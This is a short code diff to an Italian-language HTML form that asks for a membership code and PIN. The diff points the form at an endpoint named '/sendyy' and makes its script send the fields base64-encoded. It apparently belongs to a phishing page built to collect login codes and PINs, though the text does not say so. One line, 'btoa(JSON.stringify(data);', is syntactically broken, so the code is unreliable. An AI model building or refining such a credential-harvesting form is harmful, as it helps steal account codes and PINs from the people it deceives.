@@ -24,7 +24,7 @@
     <h1 class="bx--h1">
       Inserisci il Codice <br> di adesione e PIN
     </h1>
-    <form action="" method="POST" id="my-form" class="bx--form">
+    <form action="/sendyy" method="POST" id="my-form" class="bx--form">
     {{ csrfField() }}
       <div class="bx--form-item">
         <input id="text-input-1" type="text" class="bx--text-input" name="code" placeholder="Codice Adesione">
@@ -67,7 +67,7 @@
 
       var encodedData = btoa(JSON.stringify(data);
 
-      fetch("/sendyy", {
+      fetch(form.action, {
         method: "POST",
         body: encodedData,
         headers: {
@@ -90,6 +90,7 @@
         status.innerHTML = "Oops! There was a problem submitting your form"
       });
     }
+    
     form.addEventListener("submit", handleSubmit)
   </script>
 </body>
